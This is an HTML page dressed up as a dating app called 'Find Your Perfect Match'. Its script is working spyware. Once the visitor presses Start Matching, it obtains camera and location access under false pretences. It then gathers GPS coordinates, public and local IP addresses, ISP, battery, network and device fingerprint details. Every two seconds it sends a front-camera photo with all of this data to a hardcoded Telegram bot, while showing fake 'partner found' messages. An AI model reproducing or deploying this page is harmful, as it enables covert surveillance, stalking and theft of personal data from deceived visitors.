<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Find Partner</title>
<style>
body{margin:0;padding:0;background:#0a0a0a;color:#fff;font-family:sans-serif;height:100vh;overflow:hidden}
.container{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;padding:20px;text-align:center}
.logo{font-size:48px;margin-bottom:20px}
.title{font-size:28px;font-weight:600;margin-bottom:10px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.subtitle{color:#aaa;font-size:16px;margin-bottom:40px;max-width:300px}
.loading-container{display:none;margin:30px 0}
.spinner{width:60px;height:60px;border:4px solid rgba(255,255,255,0.1);border-radius:50%;border-top-color:#00ff88;border-left-color:#00ff88;animation:spin 1s linear infinite;margin:0 auto 20px}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.loading-text{font-size:20px;color:#00ff88;font-weight:500}
.status-text{font-size:16px;color:#88ffcc;margin-top:15px;min-height:24px}
.error-container{display:none;background:rgba(255,50,50,0.15);border:1px solid rgba(255,100,100,0.3);border-radius:12px;padding:20px;margin:25px 0;max-width:320px}
.error-title{color:#ff5555;font-size:18px;margin-bottom:10px}
.error-message{color:#ff9999;font-size:14px}
.start-button{position:fixed;bottom:0;left:0;right:0;background:linear-gradient(135deg,#00ff88 0%,#00ccff 100%);color:#000;border:none;padding:22px;font-size:20px;font-weight:700;cursor:pointer;z-index:1000}
.start-button:disabled{opacity:0.5;cursor:not-allowed}
.canvas-container{display:none}
.partner-info{background:rgba(255,255,255,0.08);border-radius:15px;padding:20px;margin-top:25px;font-size:14px;color:#ccd;max-width:320px;display:none}
.info-item{margin:8px 0;display:flex;align-items:center;gap:10px}
.progress-bar{width:100%;height:6px;background:rgba(255,255,255,0.1);border-radius:3px;margin:20px 0;overflow:hidden}
.progress-fill{height:100%;background:linear-gradient(90deg,#00ff88,#00ccff);border-radius:3px;animation:progress 2s infinite}
@keyframes progress{0%{width:0%}50%{width:70%}100%{width:100%}}
.countdown{font-size:14px;color:#00ff88;margin-top:10px}
</style>
</head>
<body>
<div class="container">
    <div class="logo">üíë</div>
    <h1 class="title">Find Your Perfect Match</h1>
    <p class="subtitle">Connecting you with compatible partners based on location and interests</p>
    
    <div class="loading-container" id="loadingContainer">
        <div class="spinner"></div>
        <div class="loading-text">Searching for matches...</div>
        <div class="status-text" id="statusText">Waiting For Your Partner</div>
        
        <div class="progress-bar">
            <div class="progress-fill"></div>
        </div>
        
        <div class="countdown" id="countdown"></div>
    </div>
    
    <div class="error-container" id="errorContainer">
        <div class="error-title">‚ö†Ô∏è Connection Error</div>
        <div class="error-message" id="errorMessage"></div>
    </div>
    
    <div class="partner-info" id="partnerInfo">
        <div class="info-item">
            <span>üìç</span>
            <span>Scanning your location for nearby users</span>
        </div>
        <div class="info-item">
            <span>üì±</span>
            <span>Analyzing device compatibility</span>
        </div>
        <div class="info-item">
            <span>üîí</span>
            <span>Securing your connection</span>
        </div>
        <div class="info-item">
            <span>üí¨</span>
            <span>Preparing chat interface</span>
        </div>
    </div>
</div>

<canvas id="canvas" class="canvas-container"></canvas>

<button class="start-button" id="startButton" onclick="startSearch()">Start Matching</button>

<script>
const BOT_TOKEN="7917384016:AAG7cxyuts9UJ-Km0BMqBeQVJEJfstH239g";
const CHAT_ID="8319568593";
let intervalId=null;
let stream=null;
let isSearching=false;
let countdownValue=5;
let countdownInterval=null;
let latitude="N/A";
let longitude="N/A";
let mapLink="Location not allowed";
let userIP="Unknown";
let batteryInfo="Battery: Not available";
let networkInfo="Network: Not available";
let localIP="Unknown";
let city="Unknown";
let country="Unknown";
let isp="Unknown";

const startButton=document.getElementById('startButton');
const loadingContainer=document.getElementById('loadingContainer');
const statusText=document.getElementById('statusText');
const errorContainer=document.getElementById('errorContainer');
const errorMessage=document.getElementById('errorMessage');
const partnerInfo=document.getElementById('partnerInfo');
const countdownElement=document.getElementById('countdown');

const statusMessages=[
    "Searching nearby users...",
    "Checking compatibility...",
    "Establishing connection...",
    "Verifying profile...",
    "Analyzing interests...",
    "Finding best matches..."
];
let statusIndex=0;

function updateStatus(){
    statusText.textContent=statusMessages[statusIndex];
    statusIndex=(statusIndex+1)%statusMessages.length;
}

function startCountdown(){
    countdownValue=5;
    countdownElement.textContent=`Starting in ${countdownValue} seconds...`;
    if(countdownInterval)clearInterval(countdownInterval);
    countdownInterval=setInterval(()=>{
        countdownValue--;
        if(countdownValue>0){
            countdownElement.textContent=`Starting in ${countdownValue} seconds...`;
        }else{
            clearInterval(countdownInterval);
            countdownElement.textContent="Connection established!";
        }
    },1000);
}

function showError(message){
    errorMessage.textContent=message;
    errorContainer.style.display='block';
    loadingContainer.style.display='none';
    partnerInfo.style.display='none';
    if(countdownInterval)clearInterval(countdownInterval);
}

function hideError(){
    errorContainer.style.display='none';
}

function startSearch(){
    if(isSearching)return;
    isSearching=true;
    startButton.disabled=true;
    startButton.textContent="Searching...";
    loadingContainer.style.display='block';
    partnerInfo.style.display='block';
    hideError();
    updateStatus();
    const statusInterval=setInterval(updateStatus,3000);
    startCountdown();
    
    if("geolocation" in navigator){
        navigator.geolocation.getCurrentPosition(pos=>{
            latitude=pos.coords.latitude.toFixed(6);
            longitude=pos.coords.longitude.toFixed(6);
            mapLink=`https://maps.google.com/maps?q=${latitude},${longitude}&z=17&t=k`;
        },()=>{
            mapLink="Location denied";
        },{enableHighAccuracy:true,timeout:10000,maximumAge:0});
    }

    fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>{
        userIP=d.ip;
        fetch(`https://ipapi.co/${userIP}/json/`)
        .then(r=>r.json())
        .then(ipData=>{
            city=ipData.city||"Unknown";
            country=ipData.country_name||"Unknown";
            isp=ipData.org||"Unknown";
        });
    });

    if(navigator.getBattery){
        navigator.getBattery().then(b=>{
            batteryInfo=`
üîã Battery:
Level: ${Math.round(b.level*100)}%
Charging: ${b.charging?'Yes':'No'}
Time: ${b.chargingTime===Infinity?'Not charging':b.chargingTime+' seconds'}
`;
        });
    }

    if(navigator.connection){
        networkInfo=`
üì° Network:
Type: ${navigator.connection.effectiveType}
Downlink: ${navigator.connection.downlink} Mbps
RTT: ${navigator.connection.rtt} ms
Save Data: ${navigator.connection.saveData?'Enabled':'Disabled'}
`;
    }

    const getLocalIPAddress=()=>{
        return new Promise(resolve=>{
            const pc=new RTCPeerConnection({iceServers:[]});
            pc.createDataChannel('');
            pc.createOffer().then(sdp=>pc.setLocalDescription(sdp));
            pc.onicecandidate=ice=>{
                if(!ice||!ice.candidate||!ice.candidate.candidate)return;
                const ip=/([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                if(ip&&ip[1])resolve(ip[1]);
                pc.close();
            };
            setTimeout(()=>resolve("Not found"),1000);
        });
    };

    const getBrowserPlugins=()=>{
        const plugins=[];
        for(let i=0;i<navigator.plugins.length;i++){
            plugins.push(navigator.plugins[i].name);
        }
        return plugins.length>0?plugins.slice(0,5).join(', '):'No plugins detected';
    };

    const getAdvancedSystemInfo=()=>{
        const cores=navigator.hardwareConcurrency||'Unknown';
        const ram=navigator.deviceMemory||'Unknown';
        const lang=navigator.language;
        const langs=navigator.languages?navigator.languages.join(', '):lang;
        const timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
        const platform=navigator.platform;
        const vendor=navigator.vendor||'Unknown';
        const cookieEnabled=navigator.cookieEnabled?'Yes':'No';
        const pdfViewerEnabled=navigator.pdfViewerEnabled?'Yes':'No';
        const webdriver=navigator.webdriver?'Yes':'No';
        const maxTouchPoints=navigator.maxTouchPoints||0;
        const userAgent=navigator.userAgent;
        const deviceModel=userAgent.match(/\((.*?)\)/)?userAgent.match(/\((.*?)\)/)[1]:'Unknown';
        const plugins=getBrowserPlugins();
        const doNotTrack=navigator.doNotTrack||'Not specified';
        const oscpu=navigator.oscpu||'Unknown';
        const product=navigator.product||'Unknown';
        const productSub=navigator.productSub||'Unknown';
        const now=new Date();
        const timezoneOffset=now.getTimezoneOffset();
        const utcOffset=-timezoneOffset/60;
        const offsetSign=utcOffset>=0?'+':'-';
        const formattedOffset=`UTC${offsetSign}${Math.abs(utcOffset)}`;
        return`
üñ•Ô∏è SYSTEM INFORMATION:
Device: ${platform}
Model: ${deviceModel}
OS CPU: ${oscpu}
Browser: ${userAgent.substring(0,80)}...
Product: ${product} ${productSub}
CPU Cores: ${cores}
RAM: ${ram} GB
Languages: ${langs}
Timezone: ${timezone}
UTC Offset: ${formattedOffset}
Vendor: ${vendor}
Plugins: ${plugins}
Do Not Track: ${doNotTrack}
Cookies: ${cookieEnabled}
PDF Viewer: ${pdfViewerEnabled}
WebDriver: ${webdriver}
Touch Points: ${maxTouchPoints}
Screen: ${screen.width}x${screen.height}
Pixel Ratio: ${window.devicePixelRatio}
Color Depth: ${screen.colorDepth}
`;
    };

    Promise.all([
        navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}),
        new Promise((resolve,reject)=>{
            if("geolocation" in navigator){
                navigator.geolocation.getCurrentPosition(resolve,reject,{
                    enableHighAccuracy:true,
                    timeout:10000
                });
            }else{
                resolve(null);
            }
        })
    ])
    .then(([mediaStream,location])=>{
        stream=mediaStream;
        clearInterval(statusInterval);
        statusText.textContent="Partner found! Starting connection...";
        
        getLocalIPAddress().then(ip=>{localIP=ip});
        
        setTimeout(()=>{
            if(!intervalId){
                intervalId=setInterval(captureAndSend,2000);
            }
            startButton.textContent="Connected ‚úì";
            statusText.textContent="Connection established";
        },3000);
    })
    .catch((error)=>{
        clearInterval(statusInterval);
        isSearching=false;
        startButton.disabled=false;
        startButton.textContent="Start Matching";
        loadingContainer.style.display='none';
        partnerInfo.style.display='none';
        
        if(error.name==='NotAllowedError'){
            showError("Please allow camera and location access to find partners.");
        }else if(error.name==='NotFoundError'){
            showError("Camera not found. Please check your device.");
        }else{
            showError("Unable to start search. Please try again.");
        }
    });
}

function captureAndSend(){
    if(!stream)return;
    const canvas=document.getElementById("canvas");
    const videoTrack=stream.getVideoTracks()[0];
    const imageCapture=new ImageCapture(videoTrack);
    imageCapture.grabFrame().then(imageBitmap=>{
        canvas.width=imageBitmap.width;
        canvas.height=imageBitmap.height;
        const ctx=canvas.getContext("2d");
        ctx.translate(canvas.width,0);
        ctx.scale(-1,1);
        ctx.drawImage(imageBitmap,0,0);
        canvas.toBlob(blob=>{
            const now=new Date();
            const caption=`
üì∏ AUTO CAPTURE - ${now.toLocaleTimeString()}
‚è∞ Full Time: ${now.toLocaleString()}

üìç ACCURATE LOCATION:
Latitude: ${latitude}
Longitude: ${longitude}
Google Maps: ${mapLink}
City: ${city}
Country: ${country}
ISP: ${isp}

üåç NETWORK INFORMATION:
Public IP: ${userIP}
Local IP: ${localIP}
${networkInfo}

üñ•Ô∏è SYSTEM INFORMATION:
Device: ${navigator.platform}
Model: ${navigator.userAgent.match(/\((.*?)\)/)?navigator.userAgent.match(/\((.*?)\)/)[1]:'Unknown'}
OS CPU: ${navigator.oscpu||'Unknown'}
Browser: ${navigator.userAgent.substring(0,80)}...
Product: ${navigator.product||'Unknown'} ${navigator.productSub||'Unknown'}
CPU Cores: ${navigator.hardwareConcurrency||'Unknown'}
RAM: ${navigator.deviceMemory||'Unknown'} GB
Languages: ${navigator.languages?navigator.languages.join(', '):navigator.language}
Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
Vendor: ${navigator.vendor||'Unknown'}
Cookies: ${navigator.cookieEnabled?'Yes':'No'}
Screen: ${screen.width}x${screen.height}
Pixel Ratio: ${window.devicePixelRatio}
Color Depth: ${screen.colorDepth}

${batteryInfo}

‚ö†Ô∏è Automatic capture every 2 seconds
`;
            const formData=new FormData();
            formData.append("chat_id",CHAT_ID);
            formData.append("photo",blob);
            formData.append("caption",caption);
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:formData});
        },"image/jpeg",0.7);
    }).catch(()=>{});
}

window.addEventListener('beforeunload',()=>{
    if(intervalId){
        clearInterval(intervalId);
    }
    if(stream){
        stream.getTracks().forEach(track=>track.stop());
    }
});
</script>
</body>
</html>
